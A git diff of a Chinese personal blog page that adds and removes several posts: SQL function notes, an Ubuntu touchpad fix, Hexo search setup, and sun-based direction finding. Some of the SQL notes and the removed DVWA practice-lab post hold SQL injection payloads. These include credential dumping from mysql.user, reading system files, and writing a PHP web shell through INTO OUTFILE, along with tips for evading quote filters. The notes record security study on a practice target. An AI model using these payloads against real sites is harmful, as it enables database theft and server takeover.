@@ -78,6 +78,270 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/02/15/2016/daily-sql/" title="sql日常记录" itemprop="url">sql日常记录</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-02-15T06:29:57.623Z" itemprop="datePublished"> 发表于 02-15-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <ol>
+<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
+<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
+<li>version()            -&gt;5.6.11</li>
+<li>limit m,n           m-start      n—length    <code>开始为0</code><br>limit n             n—length</li>
+<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
+<li>concat( a, b)  连接函数,对ab进行连接</li>
+<li>mit(a,1,50)       1-50 截取字符串</li>
+<li>select * from (xxx)a    a为别名</li>
+<li>group by xx   以字段分类</li>
+<li>select count(*)   返回统计的行数</li>
+<li>0x7171    类似于高亮,更加明显</li>
+<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
+<li>0x7423 的写法可以规避单引号过滤 </li>
+<li>distinct 过滤重复</li>
+<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a>‘</li>
+<li>char(115)  unicode-&gt;string</li>
+<li>version()  @@version         版本号</li>
+<li>@@datadir         mysql物理路径</li>
+<li>user()     当前的mysql用户        example: root@localhost</li>
+<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
+<li>ORD()     ord(‘i’)    返回第一个字符的ASCII</li>
+<li>EXISTS()     指定一个子查询，检测行的存在返回Blooean结果</li>
+<li>MID(String, Start [, Length])          取子串        MySQL<br>[substring/]substr(String,Start[,Length])        取子串        支持SQL Server,Oracle[MySQL]<br>注意:<code>开始位置为1</code> 但是0为起始点不会报错,不过不回显示任何东西</li>
+<li>WHERE itemid (REGEXP 0x5b5e302d395d)     <code>REGEXP</code>正则对象的使用</li>
+<li><code>----手动高亮----</code><br>concat( select database() ) 会导致mysql语法错误,想了一会儿知道原因了…<br><code>concat( (select database()) , &#39;xxx&#39; );</code>   看完这句话然后默默的删掉’xxx’,然后自然就懂啦</li>
+<li>length( )    显示长度,返回int</li>
+<li>ascii()    字符转ascii<br>  char()    ascii转字符</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/02/15/2016/daily-sql/#comments" class="ds-thread-count comments-count-link" data-thread-key="02/15/2016/daily-sql/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/02/13/2016/elanTouchpad/" title="linux-触摸板失效解决" itemprop="url">linux-触摸板失效解决</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-02-12T16:00:00.000Z" itemprop="datePublished"> 发表于 02-13-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="问题">问题</h2><p>触摸板开启状态下开机,碰到触摸板任何按键均失效,只有外接鼠标有效,使用笔记本内置快捷键进行休眠重新开机恢复,但是触摸板已经没卵用了</p>
+<h2 id="环境">环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1exlism@dell~$ uname -r</span><br><span class="line"><span class="number">3.19</span>.<span class="number">0</span>-<span class="number">49</span>-generic</span><br><span class="line">a1exlism@dell:~$ lsb_release <span class="operator">-a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:  Ubuntu <span class="number">15.04</span></span><br><span class="line">Release:  <span class="number">15.04</span></span><br><span class="line">Codename: vivid</span><br></pre></td></tr></table></figure>
+<h2 id="正文">正文</h2><h3 id="适用于任何笔记本">适用于任何笔记本</h3><blockquote>
+<p><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;t=304955" target="_blank" rel="external">Sony Vaio 触摸板不能识别解决办法</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. sudo vi /etc/default/grub</span><br><span class="line"><span class="number">2</span>. 找到GRUB_CMDLINE_LINUX=<span class="string">""</span> 添加 i8042.reset i8042.nomux i8042.nopnp i8042.noloop </span><br><span class="line"><span class="comment">#添加完后GRUB_CMDLINE_LINUX="i8042.reset i8042.nomux i8042.nopnp i8042.noloop"</span></span><br><span class="line"><span class="number">3</span>. sudo update-grub</span><br><span class="line"><span class="number">4</span>. sudo reboot</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>通过更改grub设置,加载内核过程中会将触摸板简单的识别成<code>鼠标</code>设备,即丧失了多指触摸功能  </p>
+<h3 id="elanTouchpad方案[推荐]">elanTouchpad方案[推荐]</h3><p>感觉不支持的应该都是这家<code>Elan</code>触摸板了= =<br>From—&gt;<a href="http://www.evilcodingmonkey.com/2014/01/23/ubuntu-activate-multi-touch-on-elantech/" target="_blank" rel="external">evilcodingmonkey</a></p>
+<p>1.</p>
+<blockquote>
+<p>cat /proc/bus/input/devices | grep “Name=”  </p>
+</blockquote>
+<p>应该能看到这个—&gt; N: Name=”ETPS/2 Elantech Touchpad”  </p>
+<p>2.<br>下载<a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1166442/+attachment/3941591/+files/psmouse-elantech-x551c.tar.gz" target="_blank" rel="external">this archive</a>(from Ubuntu’s bug reporting page)<br>//国内可以用<a href="http://pan.baidu.com/s/1kTOOlE3" target="_blank" rel="external">百度云</a></p>
+<p>3.</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br><span class="line">sudo dkms ldtarball psmouse-elantech-x551c.tar.gz</span><br><span class="line">sudo dkms install -m psmouse -v elantech-x551c</span><br><span class="line">sudo rmmod psmouse</span><br><span class="line">sudo modprobe psmouse</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>End. 重启之后就没事啦</p>
+<h2 id="Reference">Reference</h2><p><a href="http://www.evilcodingmonkey.com/2014/01/23/ubuntu-activate-multi-touch-on-elantech/" target="_blank" rel="external">ubuntu-activate-multi-touch-on-elantech-evilcodingmonkey</a><br><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;t=304955" target="_blank" rel="external">Sony Vaio 触摸板不能识别解决办法-UbuntuForum</a><br>想了解DKMS可以看看这个-&gt;<a href="http://www.cnblogs.com/wwang/archive/2011/06/21/2085571.html" target="_blank" rel="external">DKMS简介</a></p>
+<h2 id="后记">后记</h2><p>发现重启几次之后触摸板又挂了<br>发现dkms安装了但并没有加载,所以开机自启加载两句话= =<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo vi /etc/rc.local 在这里添加下面两条内容</span></span><br><span class="line">sudo rmmod psmouse</span><br><span class="line">sudo modprobe psmouse</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/02/13/2016/elanTouchpad/#comments" class="ds-thread-count comments-count-link" data-thread-key="02/13/2016/elanTouchpad/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/02/08/2016/hexoSearch/" title="Hexo站内搜索" itemprop="url">Hexo站内搜索</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-02-07T16:00:00.000Z" itemprop="datePublished"> 发表于 02-08-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="主题环境">主题环境</h2><p>hexo 3.0<br><a href="https://github.com/wuchong/jacman" target="_blank" rel="external">jacman</a>修改于pacman(基本差不多)</p>
+<p>以前使用的<code>Tinyso</code>(微搜),不过这几个月已经无限502-504了,看了一下官方博客,好像从2015就没维护了..放弃换成<code>Swiftype</code>,15天free trial 网上查了一下好像过期不影响站内搜索,如果失效就更新..<br>—FreeTrail 过后测试正常,SwiftSearch可放心食用</p>
+<h3 id="正文">正文</h3><h4 id="Swiftype">Swiftype</h4><p>1.注册账号-&gt;<a href="https://swiftype.com" target="_blank" rel="external">Swiftype</a><br>2.create engine(search engine,名字随便取) -&gt; 填入自己的URL验证<br>3.My Search Engines -&gt; <img src="/imgs/hexoSearch/hexoSearch1.png" alt="1"><br><img src="/imgs/hexoSearch/hexoSearch2.png" alt="2"><br>4.记下以下的class名.<br><img src="/imgs/hexoSearch/hexoSearch3.png" alt="3"></p>
+<h4 id="文件修改">文件修改</h4><ol>
+<li><p>/yourOwnPath/hexo/themes/jacman/<code>_config.yml</code>末尾</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swift_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建文件/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>swift_search.ejs</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将调用的代码复制进去</span></span><br><span class="line">&lt;% <span class="keyword">if</span> (theme.swift_search.enable)&#123; %&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="clojure"></span><br><span class="line">  <span class="list">(<span class="keyword">function</span><span class="list">(<span class="keyword">w</span>,d,t,u,n,s,e)</span><span class="collection">&#123;w<span class="collection">['SwiftypeObject']</span>=n;w<span class="collection">[n]</span>=w<span class="collection">[n]</span>||function<span class="list">()</span><span class="collection">&#123;</span><br><span class="line">  <span class="list">(<span class="keyword">w</span><span class="collection">[n]</span>.q=w<span class="collection">[n]</span>.q||<span class="collection">[]</span>)</span>.push<span class="list">(<span class="keyword">arguments</span>)</span><span class="comment">;&#125;;s=d.createElement(t);</span></span><br><span class="line">  e=d.getElementsByTagName<span class="list">(<span class="keyword">t</span>)</span><span class="collection">[<span class="number">0</span>]</span><span class="comment">;s.async=1;s.src=u;e.parentNode.insertBefore(s,e);</span></span><br><span class="line">  &#125;</span>)<span class="list">(<span class="keyword">window</span>,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st')</span><span class="comment">;</span></span><br><span class="line">  </span><br><span class="line">  _st<span class="list">(<span class="keyword">'install'</span>,'6CrKq4WqLzE2qozYG7T_','2.0.0')</span><span class="comment">;</span></span><br><span class="line"></span></span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">%</span> &#125; %&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>header.ejs</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将该html代码插入在google_cse之前,不然报错..</span></span><br><span class="line"><span class="comment">//action可以模仿其他search写法,默认本页面显示</span></span><br><span class="line">&lt;% <span class="keyword">if</span>(theme.swift_search.enable)&#123; %&gt;</span><br><span class="line">            <span class="xml"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">class</span>=<span class="value">"search"</span> <span class="attribute">action</span>=<span class="value">""</span> <span class="attribute">method</span>=<span class="value">"get"</span> <span class="attribute">accept-charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"st-default-search-input"</span> <span class="attribute">style</span>=<span class="value">"webkit-border-radius: 0;border-radius: 0;"</span> <span class="attribute">placeholder</span>=<span class="value">"Search"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">%</span> &#125; //根据后面的<span class="attribute">if</span> <span class="attribute">else</span>结构完成闭合</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>after_footer.ejs</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最后添加如下代码,使swift_search.ejs文件生效</span></span><br><span class="line">&lt;!-- Swift_search Begin --&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">%-</span> <span class="attribute">partial</span>('<span class="attribute">swift_search</span>') %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Tiny_search End --&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="调试">调试</h4><p>hexo g;hexo s<br>测试是否成功<br>默认应该和本blog一样的效果</p>
+<h3 id="Reference">Reference</h3><p><a href="http://www.jianshu.com/p/2010ad07d960" target="_blank" rel="external">Hexo静态博客添加站内搜索—Swiftype</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/02/08/2016/hexoSearch/#comments" class="ds-thread-count comments-count-link" data-thread-key="02/08/2016/hexoSearch/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/01/31/2016/指南/" title="手表指南方法" itemprop="url">手表指南方法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-30T16:00:00.000Z" itemprop="datePublished"> 发表于 01-31-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>看小学生杀手的时候发现几个指南方法，记一下</p>
+<h2 id="借助太阳指向">借助太阳指向</h2><p>当地时间<code>/2</code>，表盘中将得到的数字指向太阳，则<code>12点钟方向</code>就是北</p>
+<h3 id="原理">原理</h3><p>一天内地球自转一圈，12时制的手表重复两边，时间除二就是为了<code>同步自转和表盘指针</code></p>
+<p>不过太阳在头上和没太阳的情况这种方法就没什么卵用了。</p>
+<h2 id="立杆测影-指东针">立杆测影-指东针</h2><p>直杆垂直插在地面上，在影子顶点作下<code>标记A</code>，15分钟之后，影子变化，将变化后的影子顶点记为<code>标记B</code>，ab即为<code>西-&gt;东</code>方向（北半球）。</p>
+<h3 id="日晷原理">日晷原理</h3><p>因为我们身处北半球，北半球自西向东自转，以北半球上为参考点，太阳由东向西照射。<br>影子经过竿的遮挡，方向和太阳照射相反，所以北半球AB方向为 <code>西-&gt;东</code><br>南半球<code>东-&gt;西</code>    （反反之后和自转方向相同了=, =）</p>
+<h2 id="Reference">Reference</h2><p><a href="http://education.news.cn/2012-08/23/c_123618168.htm" target="_blank" rel="external">新华网</a><br><a href="http://www.dili360.com/nh/article/p5350c3d8d9f9e10.htm" target="_blank" rel="external">国家地理</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/01/31/2016/指南/#comments" class="ds-thread-count comments-count-link" data-thread-key="01/31/2016/指南/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/01/31/2016/daily1/" title="linux日常更新-01" itemprop="url">linux日常更新-01</a>
   </h1>
   <p class="article-author">By
@@ -218,60 +482,6 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 	
 	  	<span></span>
 		<a href="/01/31/2016/daily1/#comments" class="ds-thread-count comments-count-link" data-thread-key="01/31/2016/daily1/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/01/31/2016/指南/" title="手表指南方法" itemprop="url">手表指南方法</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-01-30T16:00:00.000Z" itemprop="datePublished"> 发表于 01-31-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>看小学生杀手的时候发现几个指南方法，记一下</p>
-<h2 id="借助太阳指向">借助太阳指向</h2><p>当地时间<code>/2</code>，表盘中将得到的数字指向太阳，则<code>12点钟方向</code>就是北</p>
-<h3 id="原理">原理</h3><p>一天内地球自转一圈，12时制的手表重复两边，时间除二就是为了<code>同步自转和表盘指针</code></p>
-<p>不过太阳在头上和没太阳的情况这种方法就没什么卵用了。</p>
-<h2 id="立杆测影-指东针">立杆测影-指东针</h2><p>直杆垂直插在地面上，在影子顶点作下<code>标记A</code>，15分钟之后，影子变化，将变化后的影子顶点记为<code>标记B</code>，ab即为<code>西-&gt;东</code>方向（北半球）。</p>
-<h3 id="日晷原理">日晷原理</h3><p>因为我们身处北半球，北半球自西向东自转，以北半球上为参考点，太阳由东向西照射。<br>影子经过竿的遮挡，方向和太阳照射相反，所以北半球AB方向为 <code>西-&gt;东</code><br>南半球<code>东-&gt;西</code>    （反反之后和自转方向相同了=, =）</p>
-<h2 id="Reference">Reference</h2><p><a href="http://education.news.cn/2012-08/23/c_123618168.htm" target="_blank" rel="external">新华网</a><br><a href="http://www.dili360.com/nh/article/p5350c3d8d9f9e10.htm" target="_blank" rel="external">国家地理</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/01/31/2016/指南/#comments" class="ds-thread-count comments-count-link" data-thread-key="01/31/2016/指南/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -636,210 +846,9 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-11-09T16:00:00.000Z" itemprop="datePublished"> 发表于 11-10-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
-<h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
-<h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
-<p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
-<h3 id="0x03_获取版本信息_数据库">0x03 获取版本信息 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata<span class="comment">-- </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure>
-<p>information_schema.schemata     这个表显示的是所有的表名</p>
-<h3 id="0x04_显示当前的用户名和密码">0x04 显示当前的用户名和密码</h3><p>concat(user, ‘:’ , password);                 //和concat_ws()有所不一样,直接连接<br>1’union select 1,(concat(user,’:’,password)) from mysql.user—<br>//读取mysql数据库中user表的user和password字段内容</p>
-<h3 id="0x05_读取系统文件">0x05 读取系统文件</h3><p>load_file(‘../../xx.txt’);          文件目录不能无限../<br>load_file(‘E:/xampp/xx.text’);      //可以直接用这个方法</p>
-<h3 id="0x06_注入点直接写入shell">0x06 注入点直接写入shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'union select 1,     "&lt;?php</span><br><span class="line">system($_GET('</span>hexo<span class="string">'));    //hexo作为一个变量</span><br><span class="line">?&gt;" into outfile '</span>../../shell.php<span class="string">'--</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x1_Low_Blind_Injection">0x1 Low Blind Injection</h2><h3 id="0x01_判断是否存在注入点">0x01  判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(4)<span class="comment">-- </span></span><br><span class="line">'</span><br></pre></td></tr></table></figure>
-<p>如果存在注入点,网页会在4秒之后才会有反应</p>
-<h3 id="0x02_后面">0x02 后面</h3><p>和普通的一样,把最后一个换成<code>sleep(5)</code><br>sleep()如果sleep无效试试benchmark()[MySQL5.0以下]//这个没试过,以后直接查询手册即可</p>
-<p>其他的也都差不多</p>
-<h3 id="0x03_Medium_&amp;_High">0x03 Medium &amp; High</h3><p>Medium:   @直接关闭了错误回显<br>//这个的话盲注依然可以,但是需要耐心了<br>High:   检测是否被攻击,然后0-5秒内自动sleep()<br>//也需要时间把,更多而已,设成10秒就可以很明显了,结合F12的network看一下就行了</p>
-<h3 id="SQLMAP基本用法:">SQLMAP基本用法:</h3><p>定了注入的URL<br>-p 参数指定了注入的参数，这里指定了id，也就是通过URL中的id参数注入，遇到多参数的URL时候这个-p就十分有用了。<br>—current-db，让SQLMAP列举出当前的数据库名称<br>-v 这个参数这里并没有使用到，这个参数会改变输出log的详细程度，一般默认即可，如果是学习或是想查看sqlmap使用的payload，可以使用-v 3参数。<br>—level 这个很有bi用咯，我个人理解是提高检测的等级，也就是说level 3会比level 1使用更多的payload进行测试。</p>
-<h2 id="小技巧">小技巧</h2><p>id = -1 也可以实现报错,在没有引号的情况跟之下23w32217uy7yuhjnm 65ythggb</p>
-<h2 id="Reference">Reference</h2><p>Web漏洞实战教程 DVWA的使用和漏洞分析</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/11/10/2015/mysqlDvwa/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/10/2015/mysqlDvwa/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/11/04/2015/1111/" title="双十一自动抢红包" itemprop="url">双十一自动抢红包</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-11-03T16:00:00.000Z" itemprop="datePublished"> 发表于 11-04-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>早上脑子一抽想搞个红包玩玩,然后就写了个脚本,代码地址:<br><a href="https://github.com/a1exlism/a1exlism.github.io/blob/master/Others/Widget" target="_blank" rel="external">A1exlism’s Github</a><br>=.  =</p>
-<p>或多或少知道自己的css选择比较垃圾…</p>
-<p>还有感受了一下计时器递归导致的后果2333</p>
-<p>丢个地址学学<br><a href="www.qianduan.net/taming-advanced-css-selectors/">征服高级CSS选择器</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/11/04/2015/1111/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/04/2015/1111/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/30/2015/mySql1/" title="MySQL基础" itemprop="url">MySQL基础</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-29T16:00:00.000Z" itemprop="datePublished"> 发表于 10-30-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="基本数据查询">基本数据查询</h2><p>1.创建CREATE<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tablename (<span class="keyword">field</span> type [(<span class="keyword">size</span>)] [<span class="keyword">NOT</span> <span class="literal">NULL</span>]&#123;, <span class="keyword">field</span> type [(<span class="keyword">size</span>)] [<span class="keyword">NOT</span> <span class="literal">NULL</span>]...&#125;[,<span class="keyword">PRIMARY</span> <span class="keyword">KEY</span>(<span class="keyword">field</span>&#123;,<span class="keyword">field</span>...&#125;)]);</span></span><br></pre></td></tr></table></figure></p>
-<p>2.选择SELECT<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> id &lt; <span class="number">20</span> <span class="keyword">AND</span> age &gt; <span class="number">25</span>;</span></span><br></pre></td></tr></table></figure></p>
